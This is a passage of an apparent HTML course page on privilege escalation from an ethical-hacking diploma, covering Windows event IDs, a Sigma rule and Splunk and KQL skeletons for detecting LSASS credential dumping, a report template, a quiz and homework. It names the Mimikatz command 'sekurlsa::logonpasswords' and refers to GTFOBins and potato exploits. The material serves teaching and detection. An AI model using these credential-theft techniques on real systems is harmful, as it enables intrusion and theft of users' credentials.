+          <rect x="490" y="112" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="134" font-size="13" fill="#4ade80" class="d-mono">7045</text><text class="d-sub" x="560" y="134">a service was installed on the system</text><text class="d-sub" x="508" y="154">unusual name / user-writable path = the tell</text><path d="M450,138 L488,138" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="lsass" tabindex="0"><rect x="20" y="176" width="430" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="198" font-size="12">Mimikatz / LSASS dump (Lab 4)</text><text class="d-sub" x="38" y="218" class="d-mono">sekurlsa::logonpasswords</text></g>
+          <rect x="490" y="176" width="430" height="52" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="198" font-size="13" fill="#4ade80" class="d-mono">Sysmon 10</text><text class="d-sub" x="590" y="198">process accessed lsass.exe</text><text class="d-sub" x="508" y="218">the top-tier credential-theft signal</text><path d="M450,202 L488,202" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <g class="node" data-node="lin" tabindex="0"><rect x="20" y="240" width="430" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="38" y="262" font-size="12">Linux SUID / sudo / cron abuse (Lab 1/2)</text><text class="d-sub" x="38" y="279" class="d-mono">GTFOBins one-liners</text></g>
+          <rect x="490" y="240" width="430" height="46" rx="8" fill="#12241c" stroke="#4ade80"/><text class="d-lbl" x="508" y="260" font-size="12.5" fill="#4ade80">auditd / EDR</text><text class="d-sub" x="508" y="278">execve of a shell from a SUID binary; uid 1000&rarr;0</text><path d="M450,263 L488,263" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; the exact event, and the field a Lab 8 rule keys on.</div>
+        <div class="dgm-detail" data-detail="tok"><h5><span class="dd-tag">T1134 · TOKEN &rarr; 4672</span>New SYSTEM rights</h5><p><b><span class="mono">4672</span> (special privileges assigned to new logon) for an account that has no business holding SeDebug/SeTcb.</b> Correlate a low-priv user&#39;s process suddenly running with SYSTEM privileges. Rule: 4672 where the account is not a known service/admin.</p></div>
+        <div class="dgm-detail" data-detail="svc"><h5><span class="dd-tag">T1543.003 · SERVICE &rarr; 7045</span>A new service</h5><p><b><span class="mono">7045</span> (a service was installed) with an unusual name or a binary in a user-writable path (Temp, a user profile).</b> Legit software installs services too &mdash; the tell is <em>where</em> the binary lives and <em>who</em> installed it. Rule: 7045 + ImagePath in a writable/temp location.</p></div>
+        <div class="dgm-detail" data-detail="lsass"><h5><span class="dd-tag">T1003.001 · LSASS &rarr; Sysmon 10</span>The crown-jewel alert</h5><p><b><span class="mono">Sysmon 10</span> (ProcessAccess) where <span class="mono">TargetImage</span> is <span class="mono">lsass.exe</span> and the <span class="mono">GrantedAccess</span> mask is a read/dump pattern (0x1010/0x1410).</b> Almost nothing legitimately opens LSASS with those rights. This is the single most valuable rule you write today.</p></div>
+        <div class="dgm-detail" data-detail="lin"><h5><span class="dd-tag">T1548.001 · LINUX &rarr; auditd/EDR</span>UID 1000 becomes 0</h5><p><b>A shell spawned by a SUID binary, a <span class="mono">setuid(0)</span> transition, or a cron job spawning an unexpected child.</b> auditd rules on <span class="mono">execve</span> + effective-UID change catch the GTFOBins one-liners. Rule: process with euid 0 whose parent is a normal-user SUID binary.</p></div>
+      </figure>
+      <div class="box key-takeaway"><span class="box-t">The rule you are about to write</span><p><strong class="hl hl-d">Elevation is rare, so it is detectable.</strong> The best single rule of the day is <b>LSASS access (Sysmon 10)</b> &mdash; it catches the credential theft that turns one host into the network. That is your Lab 8.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 8: write the rule">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P22</span><span class="tag lab">Hands-on · everyone · the signature exercise</span><span class="time">&#9201; 16 min</span></div>
+      <h1>Lab 8 &mdash; Detect the Escalation You Just Ran</h1>
+      <p class="lede">Become the SOC analyst who catches privilege escalation &mdash; from the 4672 / 7045 / Sysmon 10 evidence your own labs generated.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why this is the exercise that defines the session</span><p>You generated the evidence in Labs 3&ndash;4: a new SYSTEM logon (4672), maybe a new service (7045), and &mdash; the big one &mdash; a process opening LSASS (Sysmon 10). Read it as a defender and write one <strong>working detection rule</strong>. The LSASS rule in particular is a real, high-value SOC detection.</p></div><div class="box warn"><span class="box-t">You need the evidence from Labs 3&ndash;4</span><p>Have your saved Sysmon/Security logs open. No lab? The fallbacks (<span class="mono">saved/lab4_lsass_sysmon.evtx</span>) contain the exact events.</p></div>      <h2><span class="h-t">The worked rule &mdash; Sigma (LSASS access = Mimikatz)</span></h2>
+      <p>The highest-value detection: a process opening a handle to <b>lsass.exe</b> with a credential-dumping access mask. Legit software almost never does this.</p>
+      <pre><code>title: LSASS Memory Access - Possible Credential Dumping
+logsource:
+  category: process_access
+  product: windows          # Sysmon Event ID 10
+detection:
+  selection:
+    TargetImage|endswith: '\lsass.exe'
+    GrantedAccess:
+      - '0x1010'
+      - '0x1410'
+      - '0x143a'
+  filter_known:
+    SourceImage|endswith:
+      - '\wininit.exe'
+      - '\Microsoft.Windows.Defender\MsMpEng.exe'
+  condition: selection and not filter_known
+tags: [attack.credential_access, attack.t1003.001]
+level: high</code></pre>
+
+      <h2><span class="h-t">Now you write one &mdash; pick your platform</span></h2>
+      <div class="split">
+        <div>
+          <p class="mono" style="color:#22d3ee">Splunk (SPL) &mdash; complete this skeleton</p>
+          <pre><code>index=win (EventCode=10 TargetImage="*\lsass.exe")
+         OR EventCode=4672 OR EventCode=7045
+| search GrantedAccess IN ("0x1010","0x1410")
+| stats count by Computer, SourceImage, _time
+| where ____   &lt;-- exclude the known-good SourceImages</code></pre>
+        </div>
+        <div>
+          <p class="mono" style="color:#22d3ee">Microsoft Sentinel (KQL) &mdash; complete this skeleton</p>
+          <pre><code>DeviceEvents
+| where ActionType == "OpenProcessApiCall"
+| where FileName =~ "lsass.exe"
+| where InitiatingProcessFileName !in~ ("wininit.exe","MsMpEng.exe")
+| where ____   &lt;-- your GrantedAccess / rarity condition</code></pre>
+        </div>
+      </div>
+      <ol class="steps">
+<li>
+<strong>Read the evidence and name the technique</strong> from the logs alone.
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You identified: the source process, the target (lsass.exe / a new service), and the access mask</li></ul></div>
+</li>
+<li>
+<strong>Write ONE complete, working rule</strong> (Sigma / SPL / KQL) for LSASS access, service install, or the 4672 anomaly.
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>The rule keys on the behaviour (who touched LSASS / installed a service), not a tool name</li><li>It excludes the known-good sources so real admin activity does not drown it</li></ul></div>
+</li>
+<li>
+<strong>Test it against a benign baseline</strong> &mdash; would antivirus or a backup agent trip it? Tune the filter.
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You can state one false-positive source and how your rule avoids it</li></ul></div>
+</li>
+</ol><div class="box key-takeaway"><span class="box-t">What you produced</span><p>One working privilege-escalation / credential-theft detection rule, from evidence you generated by escalating. The honest close: <strong>EDR flags Mimikatz and potato exploits in near-real-time</strong> &mdash; the modern attacker&#39;s problem is not getting SYSTEM, it is doing it quietly, which is Session 7.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 9: engagement report">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P23</span><span class="tag lab">Hands-on · teams · the deliverable</span><span class="time">&#9201; 14 min</span></div>
+      <h1>Lab 9 &mdash; Write the Engagement Report</h1>
+      <p class="lede">The deliverable that proves the whole offensive half: the full chain on your capstone, with proof and remediation. This is what a client pays for.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why the report is the real deliverable</span><p>A root shell is worth little to a client without a <strong>report</strong> that tells them what you did, how, what it means, and how to fix it. This is the capstone of the diploma&#39;s offensive half &mdash; and the single most job-relevant artefact you produce. Write it as if handing it to a paying client.</p></div>
+      <h2><span class="h-t">The structure &mdash; keep it to these sections</span></h2>
+      <div class="tbl-scroll">
+      <table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+        <thead><tr><th>Section</th><th>What goes in it</th></tr></thead>
+        <tbody>
+          <tr><td><strong>Executive summary</strong></td><td>One paragraph a manager can read: was the box compromised, how bad, the single most important fix. No jargon.</td></tr>
+          <tr><td><strong>Scope &amp; authorisation</strong></td><td>The exact target(s), the dates, and the statement that everything stayed in the authorised host-only lab.</td></tr>
+          <tr><td><strong>Methodology</strong></td><td>The phases you ran: recon &rarr; scan &rarr; enumerate &rarr; way in &rarr; shell &rarr; privesc. The kill chain, applied.</td></tr>
+          <tr><td><strong>Findings</strong> (per issue)</td><td>Title, <strong>severity</strong>, evidence (command + output/screenshot), impact, and a <strong>remediation</strong> line. One block per vulnerability.</td></tr>
+          <tr><td><strong>Proof of compromise</strong></td><td><span class="mono">id</span>/<span class="mono">whoami</span> as root/SYSTEM, the flags, and the credentials dumped (redacted).</td></tr>
+          <tr><td><strong>Remediation summary</strong></td><td>The fixes, ordered by priority &mdash; what to do Monday morning.</td></tr>
+        </tbody>
+      </table>
+      </div>
+      <div class="box lab-box"><span class="box-t">Open the team report</span><p>Record the capstone in your cumulative <a href="report.html">Team Report</a> &mdash; it carries forward from S2&ndash;S5 and now closes the loop from recon to root, exportable to HTML/PDF. Grade: <b>pass</b> = every phase with proof + a remediation per finding; <b>needs-review</b> = a pile of screenshots with no narrative or fixes.</p></div><div class="box key-takeaway"><span class="box-t">The line that separates a hacker from a professional</span><p><strong class="hl">Anyone can get root; a professional can explain it and fix it.</strong> The report &mdash; severity, evidence, remediation &mdash; is the job. This is the deliverable that completes the offensive half of your diploma.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Where next">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P24</span><span class="tag theory">Bridge · System Hacking complete</span><span class="time">&#9201; 5 min</span></div>
+      <h1>System Hacking Complete. What&#39;s Next.</h1>
+      <p class="lede">You have run the full offensive kill chain end to end. Here is where the diploma goes from here.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">What you can now do</span><p>Recon (S2), scan &amp; enumerate (S3), turn that into a vulnerability and a credential (S4), exploit it to a shell (S5), and escalate to full control and document it (S6). That is the complete <strong>System Hacking</strong> arc &mdash; the core of ethical hacking, and the heart of the CEH exam. You can take an IP to root and write it up.</p></div>
+      <div class="split">
+        <div class="box soc"><span class="box-t">The defensive thread you have built</span><p>Every session you also wrote a detection: port-scan (S3), credential-attack (S4), reverse-shell (S5), privesc/LSASS (S6). You can sit on <em>either</em> side of the wire &mdash; which is exactly the SOC-analyst career this diploma&#39;s students are aiming at.</p></div>
+        <div class="box attacker-view"><span class="box-t">What the remaining sessions add</span><p>The rest of the diploma widens the surface: <strong>malware</strong> (S7), <strong>web application hacking &amp; SQLi</strong> (S8), <strong>sniffing / MITM / social engineering</strong> (S9), and <strong>evasion / wireless / emerging tech</strong> (S10). Each is a new attack surface on the same methodology you now own.</p></div>
+      </div>
+      <div class="box key-takeaway"><span class="box-t">The through-line of the whole diploma</span><p><strong class="hl">One methodology, every target.</strong> Recon &rarr; scan &rarr; access &rarr; escalate &rarr; document does not change &mdash; only the surface does. You have proven it on Linux, Windows and a full capstone. The rest is breadth.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Knowledge check">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P25</span><span class="tag theory">Wrap-up · self-scoring</span><span class="time">&#9201; 8 min</span></div>
+      <h1>Knowledge Check</h1>
+      <p class="lede">Six questions. Answer before you reveal &mdash; each explains the &quot;why,&quot; not just the letter.</p>
+    </div>
+    <div class="content">
+<div class="q mcq" data-correct="c" data-why="Enumeration finds the misconfiguration; the exploit is a one-liner once you have found the target. Skipping enumeration means guessing.">
+  <p><span class="qn">Q1</span>What is the single most important activity in privilege escalation?</p>
+  <ul class="opts"><li data-opt="a">Running a kernel exploit first</li><li data-opt="b">Memorising every GTFOBins entry</li><li data-opt="c">Thorough enumeration &mdash; finding the one misconfiguration to abuse</li><li data-opt="d">Trying every exploit until one works</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="b" data-why="A SUID binary runs with the privileges of its owner (often root), regardless of who launches it &mdash; so a GTFOBins one-liner spawns a root shell.">
+  <p><span class="qn">Q2</span>Why is a SUID binary owned by root dangerous?</p>
+  <ul class="opts"><li data-opt="a">It stores the root password</li><li data-opt="b">It runs as its owner (root) no matter who executes it &mdash; GTFOBins turns that into a root shell</li><li data-opt="c">It disables SELinux</li><li data-opt="d">It can only be read by root</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="c" data-why="SeImpersonatePrivilege lets the account impersonate a token handed to it; a potato exploit tricks a SYSTEM service into handing over a SYSTEM token.">
+  <p><span class="qn">Q3</span>A Windows service account holds SeImpersonatePrivilege. Why is that almost game over?</p>
+  <ul class="opts"><li data-opt="a">It can read the SAM directly</li><li data-opt="b">It disables Defender</li><li data-opt="c">A potato exploit coerces a SYSTEM token it can then impersonate &mdash; giving SYSTEM</li><li data-opt="d">It grants domain admin automatically</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="a" data-why="Mimikatz reads LSASS memory, which caches the credentials of logged-on users &mdash; often including a domain admin &mdash; turning one host into network access.">
+  <p><span class="qn">Q4</span>Why is dumping LSASS with Mimikatz so valuable to an attacker?</p>
+  <ul class="opts"><li data-opt="a">LSASS caches logged-on users&#39; passwords, hashes and tickets &mdash; often a domain admin&#39;s</li><li data-opt="b">It disables the firewall</li><li data-opt="c">It is undetectable</li><li data-opt="d">It gives kernel code execution</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="c" data-why="Opening a handle to lsass.exe with a read/dump access mask is Sysmon Event ID 10, and almost nothing legitimate does it &mdash; the top credential-theft signal.">
+  <p><span class="qn">Q5</span>What is the single highest-value SOC detection for the credential theft in this session?</p>
+  <ul class="opts"><li data-opt="a">A failed logon (4625)</li><li data-opt="b">A DNS query</li><li data-opt="c">A process opening lsass.exe with a dump access mask (Sysmon 10)</li><li data-opt="d">An outbound connection on 443</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+<div class="q mcq" data-correct="b" data-why="The report &mdash; severity, evidence, remediation &mdash; is the client-facing deliverable. A root shell without a report is worth far less.">
+  <p><span class="qn">Q6</span>Why does the engagement report matter as much as getting root?</p>
+  <ul class="opts"><li data-opt="a">It is required to launch Metasploit</li><li data-opt="b">It is what a client pays for &mdash; severity, evidence and remediation, not just a shell</li><li data-opt="c">It automatically patches the findings</li><li data-opt="d">It is only needed for compliance</li></ul>
+  <div class="mcq-fb"></div>
+</div>
+    </div>
+  </section>
+  <section class="page" data-title="Practice range &amp; plan">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P26</span><span class="tag theory">Practise privesc &mdash; free</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Practise Privilege Escalation &mdash; Free</h1>
+      <p class="lede">A free path on TryHackMe that drills exactly today&#39;s Linux and Windows escalation, then a capstone-style box.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">How to use this list</span><p>The local lab and the two capstones are the spine &mdash; these rooms are for repetition. Ordered by what to do first; the two PrivEsc rooms are the direct drills for Half A and Half B.</p></div>
+      <div class="practice">
+        <div class="practice-h"><span class="pr-t">Practice this session</span><span class="pr-plat">TryHackMe · free path</span></div>
+        <p class="pr-why">Linux then Windows privilege escalation, exactly as taught &mdash; then a full-chain box to rehearse the capstone.</p>
+        <ul class="pr-list">
+        <li><div class="pr-row"><a href="https://tryhackme.com/room/linuxprivesc" target="_blank" rel="noopener">Linux PrivEsc</a><span class="res-tag free">Free</span><span class="pr-meta">~90 min · easy</span></div><p class="pr-note"><b>Half A, drilled:</b> SUID, sudo/GTFOBins, cron, PATH, capabilities and kernel &mdash; every Linux vector on one box. <b>Do this first</b>; it is Lab 1&ndash;2 with more paths.</p></li><li><div class="pr-row"><a href="https://tryhackme.com/room/commonlinuxprivesc" target="_blank" rel="noopener">Common Linux Privesc</a><span class="res-tag free">Free</span><span class="pr-meta">~60 min · easy</span></div><p class="pr-note">More SUID/sudo/cron practice with a clear methodology. <b>Do this</b> to make the enumeration loop automatic.</p></li><li><div class="pr-row"><a href="https://tryhackme.com/room/blaster" target="_blank" rel="noopener">Blaster</a><span class="res-tag free">Free</span><span class="pr-meta">~50 min · easy</span></div><p class="pr-note">Windows exploitation into a manual privilege escalation (a scheduled-task/registry route). <b>Do this</b> to rehearse Half B end to end.</p></li><li><div class="pr-row"><a href="https://tryhackme.com/room/kenobi" target="_blank" rel="noopener">Kenobi</a><span class="res-tag free">Free</span><span class="pr-meta">~60 min · easy</span></div><p class="pr-note">A full chain &mdash; SMB/FTP recon &rarr; ProFTPD shell &rarr; <b>SUID</b> privesc. <b>Do this last</b> as a capstone rehearsal before DoubleTrouble/Blackpearl.</p></li>
+        </ul>
+      </div>
+      <div class="box warn"><span class="box-t">One rule for all of these</span><p>Every room is an <em>authorised</em> target you deploy for yourself. Point today&#39;s privesc techniques at anything you were not given and it is a crime &mdash; the same authorisation line that has run through every session.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Takeaways &amp; homework">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P27</span><span class="tag theory">Wrap-up</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Takeaways &amp; Homework</h1>
+      <p class="lede">Six lines to keep, and the work that finishes the offensive half of your diploma.</p>
+    </div>
+    <div class="content">
+      <div class="split">
+        <div class="box key-takeaway"><span class="box-t">The six lines</span><p><b>1.</b> Getting in is access; getting root is control. &nbsp; <b>2.</b> Enumeration is 90% of privesc &mdash; run the loop, don&#39;t guess. &nbsp; <b>3.</b> If root runs something you can change, you are root (SUID/sudo/cron). &nbsp; <b>4.</b> SeImpersonate is SYSTEM with an extra step. &nbsp; <b>5.</b> SYSTEM on one box is credentials for the network (LSASS/Mimikatz). &nbsp; <b>6.</b> Anyone can get root; a professional writes the report.</p></div>
+        <div class="box soc"><span class="box-t">Where you are now</span><p>You can take an IP to root on Linux and Windows, loot it, run the whole chain on a fresh machine, and detect every step. The offensive core of the diploma is complete.</p></div>
+      </div>
+      <h2><span class="h-t">Homework</span></h2>
+      <div class="box lab-box"><span class="box-t">Due before Session 7</span><p><b>1.</b> Finish <b>both capstones</b> (DoubleTrouble + Blackpearl) and submit the <b>engagement report</b> for at least one &mdash; every section, with remediation. &nbsp; <b>2.</b> Complete the <b>Linux PrivEsc</b> room and list every vector you used. &nbsp; <b>3.</b> Write your <b>Lab 8 detection rule</b> (the LSASS one is best) and name one false-positive source it survives. &nbsp; <b>4.</b> One paragraph: for a host where you got SYSTEM, what would you do next to reach the domain, and how would a SOC catch it?</p></div><div class="box note"><span class="box-t">Bring to Session 7</span><p>Your completed engagement report and the credentials you dumped &mdash; Session 7 (Malware Threats) builds and analyses the payloads that establish and hide footholds like the ones you created today.</p></div>
+    </div>
+  </section>
+
+  <div class="pagenav">
+    <a href="#" id="btnPrev"><small>Previous</small><span class="lbl">&mdash;</span></a>
+    <a href="#" id="btnNext" class="next"><small>Next</small><span class="lbl">&mdash;</span></a>
+  </div>
+  <p class="kbd-hint">Navigate with <span class="kbd">&larr;</span> <span class="kbd">&rarr;</span> arrow keys ·
+     <span class="kbd">Home</span> / <span class="kbd">End</span> to jump</p>
+
+  </article>
+</div>
+</div>
+
+<footer class="site-foot">
+  <div class="wrap"><p>CEH Diploma · ITGate Academy · Session 06 — System Hacking III</p></div>
+</footer>
+
+<script src="../assets/js/session.js"></script>
+</body>
+</html>
